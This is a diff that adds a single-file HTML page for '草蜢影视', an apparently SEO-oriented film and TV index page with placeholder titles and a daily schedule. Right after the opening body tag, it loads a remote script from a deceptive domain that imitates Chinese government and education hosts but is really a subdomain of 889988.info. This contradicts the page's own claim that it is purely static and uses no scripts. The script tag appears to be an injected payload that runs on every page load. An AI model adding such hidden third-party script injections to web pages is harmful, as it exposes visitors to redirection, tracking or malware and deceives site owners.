@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>草蜢影视 - 电影剧集动漫在线点播索引</title>
+<meta name="description" content="草蜢影视（caomengyingshi-h5）是清新风格的影视索引单页，收录电影、剧集、动漫、综艺、纪录片与短剧六大频道，附每日放映场次，移动端自适应。" />
+<meta name="keywords" content="草蜢影视, caomengyingshi-h5, 影视索引, 在线点播, 电影剧集" />
+<link rel="canonical" href="https://caomengyingshi-h5.github.io/" />
+<style>
+    :root{
+        --leaf:#2f7a4d;
+        --leaf-deep:#1d5a37;
+        --bud:#8fd97a;
+        --dew:#eafaf0;
+        --paper:#f7f5ec;
+        --ink:#233029;
+        --muted:#6d7c70;
+        --line:#d5e4d6;
+        --earth:#efe6d2;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    html{scroll-behavior:smooth;}
+    body{
+        background:var(--paper);
+        color:var(--ink);
+        font-family:"PingFang SC","Microsoft YaHei",Arial,sans-serif;
+        line-height:1.75;
+        -webkit-text-size-adjust:100%;
+        background-image:
+            linear-gradient(rgba(143,217,122,.10) 1px,transparent 1px),
+            linear-gradient(90deg,rgba(143,217,122,.10) 1px,transparent 1px);
+        background-size:34px 34px;
+    }
+    a{color:var(--leaf-deep);text-decoration:none;}
+
+    /* 田埂门面 */
+    .field{
+        position:relative;
+        padding:56px 18px 44px;
+        text-align:center;
+        background:
+            radial-gradient(120% 90% at 50% 0%,rgba(255,255,255,.55),transparent 60%),
+            linear-gradient(180deg,#cfeac3,#e6f3dd);
+        border-bottom:4px solid var(--leaf);
+        overflow:hidden;
+    }
+    .field .blade{
+        font-size:42px;
+        line-height:1;
+        filter:drop-shadow(0 3px 0 rgba(29,90,55,.25));
+    }
+    .field h1{
+        font-size:32px;
+        letter-spacing:5px;
+        color:var(--leaf-deep);
+        margin-top:6px;
+        font-weight:800;
+    }
+    .field .sub{margin-top:8px;font-size:13px;color:var(--muted);letter-spacing:1px;}
+    .field .url{margin-top:5px;font-size:12px;color:#5d705f;}
+
+    /* 三栏田垄 */
+    .furrow{
+        max-width:1120px;
+        margin:auto;
+        padding:20px 14px 40px;
+        display:grid;
+        grid-template-columns:158px 1fr 240px;
+        gap:16px;
+        align-items:start;
+    }
+
+    /* 藤蔓导航 */
+    .vine{
+        position:sticky;top:14px;
+        background:#fff;
+        border:1px solid var(--line);
+        border-radius:14px;
+        padding:12px;
+    }
+    .vine .lab{
+        font-size:11px;color:var(--leaf-deep);letter-spacing:2px;
+        padding-bottom:8px;margin-bottom:8px;
+        border-bottom:1px dashed var(--line);
+    }
+    .vine a{
+        display:flex;align-items:center;gap:8px;
+        padding:9px 10px;border-radius:9px;font-size:13px;color:var(--ink);
+    }
+    .vine a:hover{background:var(--dew);color:var(--leaf-deep);}
+    .vine a i{
+        width:7px;height:7px;border-radius:50% 50% 50% 0;
+        background:var(--bud);transform:rotate(45deg);font-style:normal;
+    }
+
+    /* 田垄区块 */
+    .ridge{
+        background:#fff;
+        border:1px solid var(--line);
+        border-radius:16px;
+        padding:18px;
+        margin-bottom:16px;
+        scroll-margin-top:14px;
+    }
+    .ridge-head{
+        display:flex;align-items:baseline;gap:10px;
+        margin-bottom:14px;padding-bottom:8px;border-bottom:2px dashed var(--line);
+    }
+    .ridge-head .no{
+        font-size:12px;color:#fff;background:var(--leaf);
+        border-radius:6px;padding:1px 8px;font-weight:700;
+    }
+    .ridge-head h2{font-size:18px;color:var(--leaf-deep);}
+    .ridge-head .more{margin-left:auto;font-size:12px;color:var(--muted);}
+
+    /* 卡片：交错田垄 */
+    .crop{
+        display:grid;
+        grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
+        gap:12px;
+    }
+    .seed{
+        background:var(--dew);
+        border:1px solid var(--line);
+        border-radius:12px;
+        padding:14px;
+        min-height:116px;
+        position:relative;
+    }
+    .seed:nth-child(2){transform:translateY(10px);}
+    .seed:nth-child(5){transform:translateY(12px);}
+    .seed .tag{
+        display:inline-block;font-size:11px;color:var(--leaf-deep);
+        border:1px solid var(--bud);border-radius:20px;padding:0 8px;margin-bottom:8px;
+    }
+    .seed b{display:block;font-size:15px;color:var(--ink);}
+    .seed p{font-size:12px;color:var(--muted);margin-top:4px;}
+
+    /* 右侧节气栏 */
+    .shoot{position:sticky;top:14px;}
+    .pod{
+        background:#fff;border:1px solid var(--line);
+        border-radius:14px;padding:14px;margin-bottom:14px;
+    }
+    .pod h3{
+        font-size:13px;color:var(--leaf-deep);letter-spacing:1px;
+        padding-bottom:6px;margin-bottom:10px;border-bottom:1px dashed var(--line);
+    }
+    .show-row{display:flex;gap:10px;margin-bottom:10px;font-size:13px;align-items:baseline;}
+    .show-row .when{
+        font-weight:700;color:var(--leaf);white-space:nowrap;font-size:12px;width:44px;
+    }
+    .show-row .what{color:var(--ink);font-weight:600;}
+    .show-row .where{display:block;font-size:11px;color:var(--muted);}
+
+    .pod ol{list-style:none;counter-reset:s;}
+    .pod li{counter-increment:s;font-size:13px;padding:6px 0 6px 26px;position:relative;color:var(--ink);}
+    .pod li::before{
+        content:counter(s);position:absolute;left:0;top:6px;
+        width:18px;height:18px;background:var(--bud);border-radius:50%;
+        color:#fff;font-size:11px;text-align:center;line-height:18px;
+    }
+
+    footer{
+        text-align:center;padding:20px 14px;
+        font-size:12px;color:var(--muted);
+        background:#fff;border-top:1px solid var(--line);
+    }
+
+    @media (max-width:900px){
+        .furrow{grid-template-columns:1fr;}
+        .vine,.shoot{position:static;}
+        .vine{display:flex;flex-wrap:wrap;}
+        .vine .lab{width:100%;}
+        .vine a{flex:1 1 auto;text-align:center;}
+        .shoot{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+        .field h1{font-size:25px;letter-spacing:3px;}
+        .seed:nth-child(n){transform:none;}
+    }
+    @media (max-width:520px){
+        .shoot{grid-template-columns:1fr;}
+    }
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="field">
+    <div class="blade">🌾</div>
+    <h1>草蜢影视</h1>
+    <div class="sub">CAOMENG YINGSHI · 清新片单 · 每日放映</div>
+    <div class="url">https://caomengyingshi-h5.github.io</div>
+</header>
+
+<div class="furrow">
+
+    <!-- 藤蔓频道导航 -->
+    <nav class="vine" aria-label="频道导航">
+        <div class="lab">田埂频道</div>
+        <a href="#film"><i></i>电影田</a>
+        <a href="#tv"><i></i>剧集田</a>
+        <a href="#anime"><i></i>动漫田</a>
+        <a href="#show"><i></i>综艺田</a>
+        <a href="#doc"><i></i>纪录田</a>
+        <a href="#short"><i></i>短剧田</a>
+        <a href="#today"><i></i>今日放映</a>
+        <a href="#about"><i></i>田头说明</a>
+    </nav>
+
+    <!-- 主田垄 -->
+    <main>
+
+        <section class="ridge" id="film">
+            <div class="ridge-head">
+                <span class="no">01</span><h2>电影田</h2>
+                <a class="more" href="#">查看片单 #</a>
+            </div>
+            <div class="crop">
+                <article class="seed"><span class="tag">动作</span><b>极夜追光</b><p>4K · 128 分钟</p></article>
+                <article class="seed"><span class="tag">剧情</span><b>城南旧信</b><p>修复版 · 96 分钟</p></article>
+                <article class="seed"><span class="tag">科幻</span><b>深空回响</b><p>杜比 · 141 分钟</p></article>
+                <article class="seed"><span class="tag">喜剧</span><b>好运降落</b><p>1080P · 103 分钟</p></article>
+            </div>
+        </section>
+
+        <section class="ridge" id="tv">
+            <div class="ridge-head">
+                <span class="no">02</span><h2>剧集田</h2>
+                <a class="more" href="#">查看片单 #</a>
+            </div>
+            <div class="crop">
+                <article class="seed"><span class="tag">更新中</span><b>长风渡口</b><p>古装 · 第 24 集</p></article>
+                <article class="seed"><span class="tag">完结</span><b>城市微光</b><p>都市 · 32 集全</p></article>
+                <article class="seed"><span class="tag">更新中</span><b>沉默星轨</b><p>悬疑 · 第 12 集</p></article>
+                <article class="seed"><span class="tag">独家</span><b>烽火家书</b><p>年代 · 第 8 集</p></article>
+            </div>
+        </section>
+
+        <section class="ridge" id="anime">
+            <div class="ridge-head">
+                <span class="no">03</span><h2>动漫田</h2>
+                <a class="more" href="#">查看片单 #</a>
+            </div>
+            <div class="crop">
+                <article class="seed"><span class="tag">国漫</span><b>山海星镜</b><p>奇幻 · EP18</p></article>
+                <article class="seed"><span class="tag">治愈</span><b>云边小站</b><p>日常 · 全 12 话</p></article>
+                <article class="seed"><span class="tag">热血</span><b>破晓之刃</b><p>战斗 · EP21</p></article>
+                <article class="seed"><span class="tag">剧场版</span><b>星尘列车</b><p>1080P · 96 分钟</p></article>
+            </div>
+        </section>
+
+        <section class="ridge" id="show">
+            <div class="ridge-head">
+                <span class="no">04</span><h2>综艺田</h2>
+                <a class="more" href="#">查看片单 #</a>
+            </div>
+            <div class="crop">
+                <article class="seed"><span class="tag">真人秀</span><b>出发吧周末</b><p>户外 · EP09</p></article>
+                <article class="seed"><span class="tag">访谈</span><b>深夜放映室</b><p>每周五</p></article>
+                <article class="seed"><span class="tag">喜剧</span><b>笑点回收站</b><p>全 10 期</p></article>
+                <article class="seed"><span class="tag">美食</span><b>舌尖上的路</b><p>旅行 · EP06</p></article>
+            </div>
+        </section>
+
+        <section class="ridge" id="doc">
+            <div class="ridge-head">
+                <span class="no">05</span><h2>纪录田</h2>
+                <a class="more" href="#">查看片单 #</a>
+            </div>
+            <div class="crop">
+                <article class="seed"><span class="tag">自然</span><b>山河纪行</b><p>4K · 6 集</p></article>
+                <article class="seed"><span class="tag">历史</span><b>古城密码</b><p>1080P · 4 集</p></article>
+                <article class="seed"><span class="tag">人文</span><b>手艺人</b><p>全 8 集</p></article>
+                <article class="seed"><span class="tag">科技</span><b>未来简史</b><p>更新中 · EP03</p></article>
+            </div>
+        </section>
+
+        <section class="ridge" id="short">
+            <div class="ridge-head">
+                <span class="no">06</span><h2>短剧田</h2>
+                <a class="more" href="#">查看片单 #</a>
+            </div>
+            <div class="crop">
+                <article class="seed"><span class="tag">剧情</span><b>重回巅峰</b><p>连续剧集 · 80 章</p></article>
+                <article class="seed"><span class="tag">情感</span><b>恰逢心动</b><p>连续剧集 · 60 章</p></article>
+                <article class="seed"><span class="tag">励志</span><b>这一局我赢</b><p>连续剧集 · 100 章</p></article>
+                <article class="seed"><span class="tag">悬疑</span><b>第13通电话</b><p>连续剧集 · 30 章</p></article>
+            </div>
+        </section>
+
+        <section class="ridge" id="today">
+            <div class="ridge-head">
+                <span class="no">07</span><h2>今日放映 · 场次</h2>
+                <a class="more" href="#">整周场次 #</a>
+            </div>
+            <div class="pod" style="border:none;padding:0;margin:0;">
+                <div class="show-row">
+                    <span class="when">20:00</span>
+                    <span><span class="what">极夜追光</span><span class="where">电影田 · 4K 首映场</span></span>
+                </div>
+                <div class="show-row">
+                    <span class="when">21:10</span>
+                    <span><span class="what">长风渡口 第24集</span><span class="where">剧集田 · 同步更新</span></span>
+                </div>
+                <div class="show-row">
+                    <span class="when">22:00</span>
+                    <span><span class="what">山海星镜 EP18</span><span class="where">动漫田 · 周更放送</span></span>
+                </div>
+                <div class="show-row">
+                    <span class="when">23:30</span>
+                    <span><span class="what">山河纪行 第1集</span><span class="where">纪录田 · 4K 自然影像</span></span>
+                </div>
+            </div>
+        </section>
+
+        <section class="ridge" id="about">
+            <div class="ridge-head">
+                <span class="no">08</span><h2>田头说明</h2>
+            </div>
+            <p style="font-size:14px;margin-bottom:8px;">
+                <b style="color:var(--leaf-deep);">草蜢影视</b>（caomengyingshi-h5）是一个以「田垄式片单」组织的影视索引单页，
+                把电影、剧集、动漫、综艺、纪录片、短剧分为六个频道，再配一张每日放映场次表，帮用户快速选定要看的内容。
+            </p>
+            <p style="font-size:14px;margin-bottom:8px;">
+                本页为纯静态单文件，全部文字直接写在 HTML 中、不依赖脚本渲染，三栏布局在手机端自动折为单栏，
+                便于搜索引擎读取标题层级与频道文本。
+            </p>
+            <p style="font-size:14px;">
+                官方地址：https://caomengyingshi-h5.github.io<br />
+                频道入口以锚点（#）组织，适合作为 GitHub Pages 上的品牌入口页与片单索引页。
+            </p>
+        </section>
+
+    </main>
+
+    <!-- 右侧节气放映栏 -->
+    <aside class="shoot">
+        <div class="pod">
+            <h3>今日场次</h3>
+            <div class="show-row"><span class="when">20:00</span><span class="what">极夜追光</span></div>
+            <div class="show-row"><span class="when">21:10</span><span class="what">长风渡口</span></div>
+            <div class="show-row"><span class="when">22:00</span><span class="what">山海星镜</span></div>
+            <div class="show-row"><span class="when">23:30</span><span class="what">山河纪行</span></div>
+        </div>
+
+        <div class="pod">
+            <h3>本周新芽 · 更新</h3>
+            <ol>
+                <li>长风渡口 更新至 24 集</li>
+                <li>山海星镜 第 18 话上线</li>
+                <li>城南旧信 修复版收录</li>
+                <li>山河纪行 新增 4K 音轨</li>
+            </ol>
+        </div>
+
+        <div class="pod">
+            <h3>田块索引</h3>
+            <p style="font-size:13px;color:var(--muted);">
+                电影 · 剧集 · 动漫 · 综艺 · 纪录片 · 短剧<br />
+                画质标注：1080P / 4K / 杜比<br />
+                终端：手机 · 平板 · 桌面自适应
+            </p>
+        </div>
+    </aside>
+
+</div>
+
+<footer>
+    © 2026 草蜢影视 · caomengyingshi-h5.github.io · 单页片单索引模板
+</footer>
+
+</body>
+</html>
